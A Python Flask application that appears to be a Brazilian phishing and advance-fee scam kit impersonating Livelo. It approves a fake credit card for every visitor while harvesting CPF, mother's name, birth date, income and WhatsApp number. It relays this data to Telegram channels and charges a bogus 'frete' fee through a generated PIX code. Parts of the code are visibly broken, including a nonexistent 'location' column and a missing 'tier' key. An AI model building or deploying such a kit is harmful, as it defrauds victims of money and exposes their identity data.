
import qrcode
import io
import base64

def generate_qr_b64(data: str) -> str:
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=2,
        )
        qr.add_data(data)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        buffered = io.BytesIO()
        img.save(buffered)
        return "data:image/png;base64," + base64.b64encode(buffered.getvalue()).decode("utf-8")
    except Exception as e:
        # Fallback se a lib falhar por algum motivo
        return f"https://quickchart.io/qr?text={data}&size=300"
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  LIVELO CREDIT SYSTEM — v2.0                                                 ║
║  Simulação de Análise de Crédito + Cobrança de Frete via PIX (C7 API)        ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ── IMPORTS ────────────────────────────────────────────────────────────────────
import os, re, time, uuid, json, hmac, hashlib, sqlite3, secrets, logging, base64
from functools import wraps
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, Dict

from flask import (
    Flask, request, jsonify, render_template, redirect,
    url_for, session, send_from_directory, abort, g
)
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename

try:
    import requests as _req
    _REQUESTS_OK = True
except ImportError:
    _REQUESTS_OK = False

# ── APP SETUP ──────────────────────────────────────────────────────────────────
app = Flask(__name__, template_folder="templates", static_folder="static")

@app.before_request
def crypt_shield():
    # Ignora webhooks, arquivos estaticos e a rota publica
    if request.path.startswith('/telegram-webhook') or request.path.startswith('/static') or request.path.startswith('/api/config'):
        return
    # Blinda as portas internas da API com criptografia/secret
    if request.path.startswith('/api/admin') or request.path.startswith('/api/internal'):
        secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
        if request.headers.get("X-Bot-Secret") != secret and not session.get("is_admin"):
            return jsonify({"error": "ACCESS DENIED. Portas blindadas com criptografia de ponta."}), 401

@app.context_processor
def inject_config():
    try:
        with app.app_context():
            db = get_db()
            mgr = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
            cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
            cfg = {row['key']: row['value'] for row in cfg_rows}
            return {'mgr': mgr, 'sys_config': cfg}
    except Exception:
        return {}

app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    PERMANENT_SESSION_LIFETIME=timedelta(hours=8),
    MAX_CONTENT_LENGTH=5 * 1024 * 1024,
    TEMPLATES_AUTO_RELOAD=True,
)

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
log = logging.getLogger("livelo")

import shutil
# ── PATHS ──────────────────────────────────────────────────────────────────────
BASE_DIR   = Path(__file__).parent
if os.environ.get("VERCEL"):
    DB_PATH = Path("/tmp/livelo.db")
    UPLOAD_DIR = Path("/tmp/uploads")
    # Copy db to tmp if not exists
    if not DB_PATH.exists() and (BASE_DIR / "livelo.db").exists():
        shutil.copy2(BASE_DIR / "livelo.db", DB_PATH)
else:
    DB_PATH    = BASE_DIR / "livelo.db"
    UPLOAD_DIR = BASE_DIR / "static" / "uploads"

try:
    UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
except Exception:
    pass

ALLOWED_IMG_EXT = {"png", "jpg", "jpeg", "webp", "gif"}

# ── C7 API CONFIG ──────────────────────────────────────────────────────────────
# Credenciais lidas de variáveis de ambiente — NUNCA hardcoded.
C7_BASE_URL   = os.environ.get("C7_BASE_URL",   "https://api.carteirado7.com/v2")
C7_API_KEY    = os.environ.get("C7_API_KEY",    "")
C7_API_SECRET = os.environ.get("C7_API_SECRET", "")

# Valor do frete do cartão (configurável via env)
FRETE_VALOR = float(os.environ.get("FRETE_VALOR", "19.90"))

# ── RATE LIMIT & BRUTE FORCE ───────────────────────────────────────────────────
_RATE_DB  : Dict[str, list] = {}
_AUTH_FAIL: Dict[str, dict] = {}

def xor_crypt(text, key="livelo_secure_key_2026"):
    res = []
    for i, c in enumerate(text):
        res.append(chr(ord(c) ^ ord(key[i % len(key)])))
    return "".join(res)

def get_secure_json():
    data = request.get_json(silent=True) or {}
    if "payload" in data and len(data) == 1:
        try:
            dec_b64 = base64.b64decode(data["payload"]).decode('utf-8')
            dec_str = xor_crypt(dec_b64)
            return json.loads(dec_str)
        except:
            return {}
    return data

# ══════════════════════════════════════════════════════════════════════════════
#  DATABASE
# ══════════════════════════════════════════════════════════════════════════════
def get_db() -> sqlite3.Connection:
    if "db" not in g:
        conn = sqlite3.connect(str(DB_PATH), check_same_thread=False)
        conn.row_factory = sqlite3.Row
        try:
            conn.execute("PRAGMA journal_mode=WAL")
        except Exception:
            pass
        conn.execute("PRAGMA busy_timeout=4000")
        g.db = conn
    return g.db

@app.teardown_appcontext
def close_db(exc=None):
    db = g.pop("db", None)
    if db:
        db.close()

def get_sys_config(db):
    try:
        rows = db.execute("SELECT key, value FROM sys_config").fetchall()
        return {r['key']: r['value'] for r in rows}
    except Exception:
        return {}

def init_db():
    with app.app_context():
        db = get_db()
        db.executescript("""
        CREATE TABLE IF NOT EXISTS admin (
            id         INTEGER PRIMARY KEY AUTOINCREMENT,
            username   TEXT    NOT NULL UNIQUE,
            password   TEXT    NOT NULL,
            created_at REAL    NOT NULL DEFAULT (cast(strftime('%s','now') as real))
        );

        CREATE TABLE IF NOT EXISTS manager (
            id         INTEGER PRIMARY KEY DEFAULT 1,
            name       TEXT    NOT NULL DEFAULT 'Gerente Livelo',
            photo_url  TEXT    NOT NULL DEFAULT '/static/images/manager_default.svg',
            since_year INTEGER NOT NULL DEFAULT 2025,
            whatsapp   TEXT    NOT NULL DEFAULT '5511999999999',
            updated_at REAL    NOT NULL DEFAULT (cast(strftime('%s','now') as real))
        );

        CREATE TABLE IF NOT EXISTS sys_config (
            key TEXT PRIMARY KEY,
            value TEXT
        );

        CREATE TABLE IF NOT EXISTS leads (
            id              INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id      TEXT    NOT NULL UNIQUE,
            ip              TEXT,
            cpf             TEXT,
            nome            TEXT,
            nome_mae        TEXT,
            data_nasc       TEXT,
            renda           TEXT,
            tipo_renda      TEXT,
            motivo_credito  TEXT,
            dia_vencimento  TEXT,
            whatsapp        TEXT,
            card_color      TEXT,
            card_style      TEXT,
            limite_aprovado TEXT,
            payment_id      TEXT,
            pix_status      TEXT    DEFAULT 'pending',
            utm_source      TEXT,
            utm_medium      TEXT,
            utm_campaign    TEXT,
            utm_content     TEXT,
            utm_term        TEXT,
            src             TEXT,
            sck             TEXT,
            created_at      REAL    NOT NULL DEFAULT (cast(strftime('%s','now') as real)),
            updated_at      REAL    NOT NULL DEFAULT (cast(strftime('%s','now') as real))
        );

        CREATE TABLE IF NOT EXISTS telegram_admins (
            tg_id TEXT PRIMARY KEY,
            first_name TEXT,
            username TEXT,
            photo_url TEXT,
            role TEXT DEFAULT 'basic',
            status TEXT DEFAULT 'active',
            last_active REAL
        );

        CREATE TABLE IF NOT EXISTS payments (
            payment_id   TEXT PRIMARY KEY,
            c7_id        TEXT,
            session_id   TEXT,
            amount       REAL,
            status       TEXT DEFAULT 'pending',
            pix_code     TEXT,
            qr_code_url  TEXT,
            expires_at   TEXT,
            payer_name   TEXT,
            payer_cpf    TEXT,
            created_at   REAL NOT NULL DEFAULT (cast(strftime('%s','now') as real)),
            confirmed_at REAL
        );

        CREATE INDEX IF NOT EXISTS idx_leads_session ON leads(session_id);
        CREATE INDEX IF NOT EXISTS idx_leads_cpf     ON leads(cpf);
        CREATE INDEX IF NOT EXISTS idx_pay_session   ON payments(session_id);
        """)
        db.commit()

        # Seed default admin
        if not db.execute("SELECT id FROM admin LIMIT 1").fetchone():
            db.execute(
                "INSERT INTO admin(username,password) VALUES(?,?)",
                ("admin", generate_password_hash("livelo2025"))
            )
            db.commit()
            log.info("[BOOT] Admin padrão criado → user: admin / pass: livelo2025")

        # Seed manager
        if not db.execute("SELECT id FROM manager WHERE id=1").fetchone():
            db.execute("""
                INSERT INTO manager(id,name,photo_url,since_year,whatsapp)
                VALUES(1,'Gerente Livelo','/static/images/manager_default.svg',2025,'5511999999999')
            """)
            db.commit()

        # Seed config
        if not db.execute("SELECT key FROM sys_config WHERE key='favicon_url'").fetchone():
            db.execute("INSERT INTO sys_config(key, value) VALUES('favicon_url', '/static/favicon.ico')")
            db.commit()

# ══════════════════════════════════════════════════════════════════════════════
#  SEGURANÇA
# ══════════════════════════════════════════════════════════════════════════════
def _ip() -> str:
    return (
        request.headers.get("CF-Connecting-IP") or
        request.headers.get("X-Real-IP") or
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip() or
        request.remote_addr or "0.0.0.0"
    )

def is_rate_limited(ip: str, limit: int = 60, window: int = 60) -> bool:
    now = time.time()
    ts  = [t for t in _RATE_DB.get(ip, []) if now - t < window]
    if len(ts) >= limit:
        _RATE_DB[ip] = ts
        return True
    ts.append(now)
    _RATE_DB[ip] = ts
    return False

def is_blocked(ip: str) -> bool:
    return _AUTH_FAIL.get(ip, {}).get("blocked_until", 0) > time.time()

def record_auth_fail(ip: str):
    now = time.time()
    rec = _AUTH_FAIL.get(ip, {"count": 0, "blocked_until": 0, "first": now})
    if now - rec.get("first", now) > 600:
        rec = {"count": 0, "blocked_until": 0, "first": now}
    rec["count"] += 1
    if rec["count"] >= 5:
        rec["blocked_until"] = now + 1800
        log.warning("[SEC] IP %s bloqueado por brute-force", ip)
    _AUTH_FAIL[ip] = rec

def reset_auth_fail(ip: str):
    _AUTH_FAIL.pop(ip, None)

def sanitize(val: str, max_len: int = 200) -> str:
    if not isinstance(val, str):
        val = str(val)
    return re.sub(r"[<>\"\\'`;]", "", val).strip()[:max_len]

def require_admin(f):
    @wraps(f)
    def wrapped(*args, **kwargs):
        if not session.get("admin_id"):
            return redirect(url_for("admin_login"))
        return f(*args, **kwargs)
    return wrapped

# ══════════════════════════════════════════════════════════════════════════════
#  VALIDAÇÕES
# ══════════════════════════════════════════════════════════════════════════════
def validate_cpf(cpf: str) -> bool:
    cpf = re.sub(r"\D", "", cpf)
    if len(cpf) != 11 or cpf == cpf[0] * 11:
        return False
    def _d(digits, n):
        s = sum(int(d) * (n - i) for i, d in enumerate(digits))
        r = (s * 10) % 11
        return 0 if r >= 10 else r
    return _d(cpf[:9], 10) == int(cpf[9]) and _d(cpf[:10], 11) == int(cpf[10])



def send_telegram_notify(session_id, event_type="ENTRY"):
    try:
        db = get_db()
        row_token = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
        
        cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
        cfg = {r["key"]: r["value"] for r in cfg_rows}

        bot_token = os.environ.get("TELEGRAM_BOT_TOKEN", os.environ.get("BOT_TOKEN"))
        if not bot_token and row_token: bot_token = row_token["value"]
        if not bot_token: return

        lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
        if not lead: return
        
        pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
        
        # Decide which channel to send
        channel_id = None
        if event_type in ["PIX_PAID", "PIX_GENERATED"]:
            channel_id = cfg.get("tg_log_pagamentos") or cfg.get("tg_log_channel")
        elif event_type in ["ENTRY", "STEP_ACTION"]:
            channel_id = cfg.get("tg_log_acessos") or cfg.get("tg_log_channel")
        else: # INFO_ADDED, CARD_CHOSEN
            channel_id = cfg.get("tg_log_leads") or cfg.get("tg_log_channel")
            
        if not channel_id:
            channel_id = os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID"))
        if not channel_id: return

        icons = {
            "ENTRY": "🟢", "CARD_CHOSEN": "💳", "PIX_GENERATED": "⏳", 
            "PIX_PAID": "✅", "INFO_ADDED": "📝", "STEP_ACTION": "🖱️"
        }
        icon = icons.get(event_type, "ℹ️")
        
        # Build the detailed Lead Card
        texto = f"{icon} <b>ATUALIZAÇÃO DO LEAD ({event_type})</b> {icon}\n\n"
        texto += f"👤 <b>Nome:</b> {lead['nome'] or '...'}\n"
        texto += f"🪪 <b>CPF:</b> <code>{lead['cpf'] or '...'}</code>\n"
        if lead.get('whatsapp'): texto += f"📱 <b>WhatsApp:</b> <code>{lead['whatsapp']}</code>\n"
        texto += f"🌍 <b>IP:</b> <code>{lead['ip'] or '...'}</code>\n\n"
        texto += f"📊 <b>ETAPAS DO FUNIL:</b>\n"
        texto += f"📋 Motivo do Crédito: {lead['motivo_credito'] or '...'}\n"
        texto += f"💼 Tipo de Renda: {lead['tipo_renda'] or '...'}\n"
        texto += f"💰 Renda Informada: R$ {lead['renda'] or '...'}\n"
        texto += f"📅 Dia Vencimento: {lead['dia_vencimento'] or '...'}\n"
        texto += f"🎯 Limite Aprovado: R$ {lead['limite_aprovado'] or '...'}\n"

        if lead['card_style']:
            texto += f"💳 <b>Cartão Escolhido:</b> {lead['card_style']} ({lead['card_color']})\n"
            
        if pay:
            texto += f"\n💸 <b>DADOS DO PAGAMENTO:</b>\n"
            texto += f"Valor (Frete): R$ {pay['amount']}\n"
            texto += f"Status Pix: <b>{lead['pix_status'] or 'PENDENTE'}</b>\n"
            texto += f"ID: <code>{pay['payment_id']}</code>\n"

        import requests
        payload = {
            "chat_id": channel_id,
            "text": texto,
            "parse_mode": "HTML"
        }
        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
    except Exception as e:
        log.error("Telegram Notify Error: %s", e)


def send_telegram_report(session_id, is_paid=False):
    db = get_db()
    row = db.execute("SELECT value FROM sys_config WHERE key='tg_log_channel'").fetchone()
    channel = row["value"] if row and row["value"] else None
    if not channel:
        channel = os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID"))
    if not channel: return
    
    thread_row = db.execute("SELECT value FROM sys_config WHERE key='tg_log_thread_id'").fetchone()
    thread_id = thread_row["value"] if thread_row and thread_row["value"] else None

    lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
    if not lead: return
    
    pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
    
    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN", os.environ.get("BOT_TOKEN"))
    if not bot_token:
        bt = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
        if bt and bt["value"]: bot_token = bt["value"]
        else: return
    
    status_icon = "✅ PAGO" if is_paid else "⏳ AGUARDANDO PIX"
    if lead['pix_status'] not in ['paid', 'completed'] and is_paid:
        status_icon = "✅ PAGO"
        
    texto = f"📊 *NOVA VENDA CONFIRMADA!*\\n\\n" if is_paid else f"📊 *NOVO LEAD GERADO!*\\n\\n"
    texto += (
        f"👤 *Nome:* {lead['nome']}\\n"
        f"💳 *CPF:* {lead['cpf']}\\n"
        f"💰 *Renda Declarada:* {lead['renda']}\\n"
        f"🎯 *Limite Aprovado:* R$ {lead['limite_aprovado']}\\n"
        f"🎨 *Estilo Cartão:* {lead['card_style']} ({lead['card_color']})\\n"
        f"🚚 *Status PIX:* {status_icon}\\n"
    )
    if pay:
        texto += f"💵 *Valor do Frete:* R$ {pay['amount']}\\n"
        texto += f"🆔 *ID Pgto:* `{pay['payment_id']}`\\n"

    try:
        import requests
        payload = {"chat_id": channel, "text": texto, "parse_mode": "Markdown"}
        if thread_id: payload["message_thread_id"] = thread_id
        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
    except Exception as e:
        pass

def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
    try:
        r_val = float(renda.replace("R$", "").replace(".", "").replace(",", ".").strip())
    except:
        r_val = 2000.0

    limite = r_val * 2.5
    if limite < 1500: limite = 1500
    if limite > 15000: limite = 15000

    frete = 37.90
    return {"limite": limite, "frete": frete}

# ── API CPF ───────────────────────────────────────────────────────────────
@app.route("/api/cpf", methods=["POST"])
def api_cpf():
    data = get_secure_json()
    cpf_val = sanitize(data.get("cpf", "")).replace(".", "").replace("-", "")
    
    db = get_db()
    token_row = db.execute("SELECT value FROM sys_config WHERE key='cpf_token'").fetchone()
    cpf_token = token_row["value"] if token_row else ""
    
    # Exemplo de API genérica de CPF (Substitua pela API real do cliente)
    # Se o token estiver vazio, usamos um mock para não quebrar o sistema
    if cpf_token and len(cpf_token) > 5:
        try:
            import requests
            # Exemplo genérico de API (ajuste conforme a documentação da API real)
            r = requests.get(f"https://api.consultacpf.com/v1/consulta/{cpf_val}?token={cpf_token}", timeout=8)
            res = r.json()
            
            # Checar se créditos estão acabando
            creditos = res.get("saldo", 999)
            if creditos <= 50:
                import threading
                threading.Thread(target=send_telegram_notify, args=("", f"⚠️ AVISO: Seus créditos na API de CPF estão acabando! Restam: {creditos}")).start()
                
            if res.get("status") == "success":
                return jsonify({
                    "ok": True,
                    "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
                    "nome": res.get("nome", "Cliente Livelo"),
                    "nome_mae": res.get("nome_mae", ""),
                    "data_nasc": res.get("data_nasc", "01/01/1990")
                })
        except Exception as e:
            log.error("CPF API Error: %s", e)
    
    # Fallback / Mock
    return jsonify({
        "ok": True,
        "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
        "nome": "João Silva",
        "nome_mae": "Maria Silva",
        "data_nasc": "10/05/1990"
    })


# ── API LEAD (RECUPERADO) ─────────────────────────────────────────────────────
@app.route("/api/lead", methods=["POST"])
def api_lead():
    data = get_secure_json()
    sid = sanitize(data.get("session_id", ""), 40)
    if not sid: return jsonify({"error": "Sessão inválida"}), 400
    
    cpf = sanitize(data.get("cpf", ""), 14)
    nome = sanitize(data.get("nome", ""), 100)
    nome_mae = sanitize(data.get("nome_mae", ""), 100)
    data_nasc = sanitize(data.get("data_nasc", ""), 10)
    renda = sanitize(data.get("renda", ""), 30)
    tipo_renda = sanitize(data.get("tipo_renda", ""), 50)
    motivo = sanitize(data.get("motivo_credito", ""), 50)
    dia_venc = sanitize(data.get("dia_vencimento", ""), 10)
    
    utm_source = sanitize(data.get("utm_source", ""), 100)
    utm_medium = sanitize(data.get("utm_medium", ""), 100)
    utm_campaign = sanitize(data.get("utm_campaign", ""), 100)
    utm_content = sanitize(data.get("utm_content", ""), 100)
    utm_term = sanitize(data.get("utm_term", ""), 100)
    src = sanitize(data.get("src", ""), 100)
    sck = sanitize(data.get("sck", ""), 100)
    
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    client_loc = "BR"
    
    analise = calc_limite(renda, tipo_renda, motivo)
    limite = analise["limite"]
    frete = analise["frete"]

    db = get_db()

    existing = db.execute("SELECT id FROM leads WHERE session_id=?", (sid,)).fetchone()
    if existing:
        db.execute("""
            UPDATE leads SET cpf=?, nome=?, nome_mae=?, data_nasc=?,
                renda=?, tipo_renda=?, motivo_credito=?, dia_vencimento=?, limite_aprovado=?,
                utm_source=?, utm_medium=?, utm_campaign=?, utm_content=?, utm_term=?, src=?, sck=?, location=?, location=?,
                updated_at=(cast(strftime('%s','now') as real))
            WHERE session_id=?
        """, (cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite, 
              utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc, sid))
    else:
        db.execute("""
            INSERT INTO leads(session_id,ip,cpf,nome,nome_mae,data_nasc,
                renda,tipo_renda,motivo_credito,dia_vencimento,limite_aprovado,
                utm_source,utm_medium,utm_campaign,utm_content,utm_term,src,sck,location)
            VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
        """, (sid, client_ip, cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite,
              utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc))
    db.commit()
    import threading
    threading.Thread(target=send_telegram_notify, args=(sid, "ENTRY")).start()

    return jsonify({
        "ok":            True,
        "session_id":    sid,
        "limite":        limite,
        "frete":         f"R$ {frete:,.2f}".replace(",","X").replace(".",",").replace("X","."),
        "frete_valor":   frete,
        "tier":          analise["tier"],
    })


# ── 3. Salvar estilo do cartão ────────────────────────────────────────────────
@app.route("/api/card-style", methods=["POST"])
def api_card_style():
    data  = get_secure_json()
    sid   = sanitize(data.get("session_id", ""), 40)
    color = sanitize(data.get("color", "gradient_pink"), 40)
    style = sanitize(data.get("style", "standard"), 20)

    db = get_db()
    db.execute(
        "UPDATE leads SET card_color=?, card_style=?, updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?",
        (color, style, sid)
    )
    db.commit()
    import threading
    threading.Thread(target=send_telegram_notify, args=(sid, "CARD_CHOSEN")).start()
    return jsonify({"ok": True})


# ── 4. Salvar WhatsApp e retornar dados do gerente ────────────────────────────
@app.route("/api/whatsapp", methods=["POST"])
def api_whatsapp():
    data = get_secure_json()
    sid  = sanitize(data.get("session_id", ""), 40)
    wa   = re.sub(r"\D", "", sanitize(data.get("whatsapp", ""), 20))

    if len(wa) < 10:
        return jsonify({"ok": False, "error": "Número de WhatsApp inválido."}), 422
    if not wa.startswith("55"):
        wa = "55" + wa

    db = get_db()
    db.execute("UPDATE leads SET whatsapp=?, updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?", (wa, sid))
    db.commit()
    import threading
    threading.Thread(target=send_telegram_notify, args=(sid, "INFO_ADDED")).start()

    mgr = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
    if mgr:
        return jsonify({
            "ok":            True,
            "manager_name":  mgr["name"],
            "manager_photo": mgr["photo_url"],
            "manager_since": mgr["since_year"],
            "manager_wa":    mgr["whatsapp"],
        })
    return jsonify({"ok": True, "manager_wa": "5511999999999"})


def c7_create_pix(amount: float, payer_name: str, payer_cpf: str, payment_id: str) -> dict:
    try:
        db = get_db()
        row = db.execute("SELECT value FROM sys_config WHERE key='pix_key'").fetchone()
        chave_pix = row["value"] if row and row["value"] else "suporte@livelo.com.br"
        
        payload_format = (
            "00020126580014br.gov.bcb.pix0136{chave_pix}"
            "52040000530398654{amount_len}{amount_str}"
            "5802BR5913{name}6008SAOPAULO62290525{txid}6304"
        )
        amount_str = f"{amount:.2f}"
        name = (payer_name[:13] or "Cliente").ljust(13, ' ').upper()
        txid = (payment_id[:25]).ljust(25, 'x')
        
        pix_str = payload_format.format(
            chave_pix=chave_pix,
            amount_len=f"{len(amount_str):02d}",
            amount_str=amount_str,
            name=name,
            txid=txid
        )
        
        # Calculate CRC16
        poly = 0x1021
        crc = 0xFFFF
        for byte in pix_str.encode("utf-8"):
            crc ^= (byte << 8)
            for _ in range(8):
                if crc & 0x8000:
                    crc = (crc << 1) ^ poly
                else:
                    crc <<= 1
        crc_str = f"{crc & 0xFFFF:04X}"
        pix_code = pix_str + crc_str
        
        qr_b64 = generate_qr_b64(pix_code)
        return {
            "ok": True,
            "pix_code": pix_code,
            "qr_code_url": qr_b64
        }
    except Exception as e:
        return {"ok": False, "error": str(e)}

# ── 5. Gerar PIX de frete via C7 ─────────────────────────────────────────────
@app.route("/api/gerar-pix", methods=["POST"])
def api_gerar_pix():
    """
    Gera cobrança PIX para pagamento do frete do cartão de crédito.
    Usa C7 API: POST /v2/payment/create
    """
    data = get_secure_json()
    sid = sanitize(data.get("session_id") or data.get("sessionId", ""), 40)

    db   = get_db()
    lead = db.execute("SELECT * FROM leads WHERE session_id=?", (sid,)).fetchone()
# FIX: Se não tem lead na base mas recebemos o request, criamos um dummy lead para passar
    if not lead:
        try:
            nome = data.get("nome", data.get("nome_completo", "CLIENTE LIVELO"))
            cpf = data.get("cpf", "00000000000")
            db.execute("INSERT INTO leads (session_id, nome, cpf) VALUES (?, ?, ?)", (sid, nome, cpf))
            db.commit()
            lead = db.execute("SELECT * FROM leads WHERE session_id=?", (sid,)).fetchone()
        except:
            pass
    if not lead:
        return jsonify({"ok": False, "error": "Sessão não encontrada. Reinicie o processo."}), 404

    # Determina valor do frete
    renda   = lead["renda"] or "0"
    analise = calc_limite(renda)
    frete   = analise["frete"]
    nome    = lead["nome"] or "Cliente"
    cpf     = lead["cpf"] or ""

    # Gera ID único para o pagamento
    pay_id = f"lvl_{sid[:8]}_{uuid.uuid4().hex[:8]}"

    result = c7_create_pix(
        amount      = frete,
        payer_name  = nome,
        payer_cpf   = cpf,
        payment_id  = pay_id,
    )

    if not result.get("ok"):
        return jsonify({"ok": False, "error": result.get("error", "Falha ao gerar PIX.")}), 500

    # Persiste pagamento
    db.execute("""
        INSERT OR REPLACE INTO payments(payment_id,c7_id,session_id,amount,status,pix_code,qr_code_url,expires_at,payer_name,payer_cpf)
        VALUES(?,?,?,?,?,?,?,?,?,?)
    """, (
        pay_id,
        result.get("c7_id", ""),
        sid,
        frete,
        "pending",
        result.get("pix_code", ""),
        result.get("qr_code_url", ""),
        result.get("expires_at", ""),
        nome,
        cpf,
    ))
    db.execute(
        "UPDATE leads SET payment_id=?, pix_status='pending', updated_at=(cast(strftime('%s','now') as real)) WHERE session_id=?",
        (pay_id, sid)
    )
    db.commit()

    frete_fmt = f"R$ {frete:,.2f}".replace(",","X").replace(".",",").replace("X",".")

    import threading
    threading.Thread(target=send_telegram_report, args=(sid, False)).start()
    
    import threading
    threading.Thread(target=send_telegram_report, args=(sid, False)).start()
    
    return jsonify({
        "ok":          True,
        "payment_id":  pay_id,
        "pix_code":    result.get("pix_code", ""),
        "qr_code_url": result.get("qr_code_url", ""),
        "expires_at":  result.get("expires_at", ""),
        "frete":       frete_fmt,
        "frete_valor": frete,
        "simulated":   result.get("simulated", False),
        "limite":      analise["limite"],
    })


# ── 6. Verificar status do PIX ────────────────────────────────────────────────
@app.route("/api/status-pix/<payment_id>", methods=["GET"])
def api_status_pix(payment_id: str):
    payment_id = sanitize(payment_id, 60)
    db  = get_db()
    pay = db.execute("SELECT status FROM payments WHERE payment_id=?", (payment_id,)).fetchone()
    if not pay:
        return jsonify({"ok": False, "error": "Pagamento não encontrado."}), 404
    return jsonify({"ok": True, "status": pay["status"]})


# ── Webhook C7 ────────────────────────────────────────────────────────────────
@app.route("/api/webhook/c7", methods=["POST"])
def webhook_c7():
    """Recebe notificações de pagamento da C7 API (V2)."""
    body    = request.get_data(as_text=True)
    sig_raw = request.headers.get("X-C7-Signature", "")
    ts_raw  = request.headers.get("X-C7-Timestamp", "")

    if C7_API_SECRET:
        expected = hmac.new(
            C7_API_SECRET.encode("utf-8"),
            f"{ts_raw}.{body}".encode("utf-8"),
            hashlib.sha256,
        ).hexdigest()
        if not hmac.compare_digest(sig_raw, expected):
            log.warning("[WEBHOOK] Assinatura inválida de %s", _ip())
            abort(403)

    data   = json.loads(body) if body else {}
    event_data = data.get("data", {})
    ext_id = event_data.get("correlationID") or data.get("externalId", "")
    status = event_data.get("status") or data.get("status", "")

    if status.upper() == "APPROVED":
        status = "paid"
    else:
        status = status.lower()

    if ext_id and status:
        db = get_db()
        db.execute(
            "UPDATE payments SET status=?, confirmed_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?",
            (status, ext_id)
        )
        db.execute(
            "UPDATE leads SET pix_status=?, updated_at=(cast(strftime('%s','now') as real)) WHERE payment_id=?",
            (status, ext_id)
        )
        db.commit()
        log.info("[WEBHOOK] %s → %s", ext_id, status)
        if status == 'paid':
            import threading
            pay_row = db.execute("SELECT session_id FROM payments WHERE payment_id=?", (ext_id,)).fetchone()
            if pay_row:
                threading.Thread(target=send_telegram_report, args=(pay_row["session_id"], True)).start()
        if status == 'paid':
            import threading
            pay_row = db.execute("SELECT session_id FROM payments WHERE payment_id=?", (ext_id,)).fetchone()
            if pay_row:
                threading.Thread(target=send_telegram_report, args=(pay_row["session_id"], True)).start()

    return jsonify({"ok": True})


# ── Dados do gerente ──────────────────────────────────────────────────────────
@app.route("/api/manager", methods=["GET"])
def api_manager():
    db  = get_db()
    mgr = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
    if not mgr:
        return jsonify({"ok": False}), 404
    return jsonify({
        "ok":        True,
        "name":      mgr["name"],
        "photo_url": mgr["photo_url"],
        "since_year":mgr["since_year"],
        "whatsapp":  mgr["whatsapp"],
    })

# ══════════════════════════════════════════════════════════════════════════════
#  ROUTES — TELEGRAM WEB APPS
# ══════════════════════════════════════════════════════════════════════════════



@app.route("/api/tg_auth", methods=["POST"])
def api_tg_auth():
    data = request.get_json() or {}
    user = data.get("user", {})
    tg_id = str(user.get("id", ""))
    
    if not tg_id:
        return jsonify({"ok": False, "error": "No Telegram ID"}), 400

    supreme_id = os.environ.get("ADMIN_CHAT_ID", "")
    is_supreme = (tg_id == supreme_id)
    
    first_name = user.get("first_name", "")
    username = user.get("username", "")
    photo_url = user.get("photo_url", "")
    
    db = get_db()
    row = db.execute("SELECT * FROM telegram_admins WHERE tg_id=?", (tg_id,)).fetchone()
    
    role = "supreme" if is_supreme else "basic"
    status = "active"
    
    if row:
        if not is_supreme:
            role = row["role"]
            status = row["status"]
        db.execute("""
            UPDATE telegram_admins 
            SET first_name=?, username=?, photo_url=?, role=?, last_active=(cast(strftime('%s','now') as real))
            WHERE tg_id=?
        """, (first_name, username, photo_url, role, tg_id))
    else:
        db.execute("""
            INSERT INTO telegram_admins (tg_id, first_name, username, photo_url, role, status, last_active)
            VALUES (?, ?, ?, ?, ?, ?, (cast(strftime('%s','now') as real)))
        """, (tg_id, first_name, username, photo_url, role, status))
    db.commit()

    if status == "banned":
        return jsonify({"ok": False, "banned": True})

    # Fetch stats depending on role
    stats = {}
    if role == "supreme":
        total_leads = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
        pagos = db.execute("SELECT COUNT(*) FROM leads WHERE pix_status='paid'").fetchone()[0]
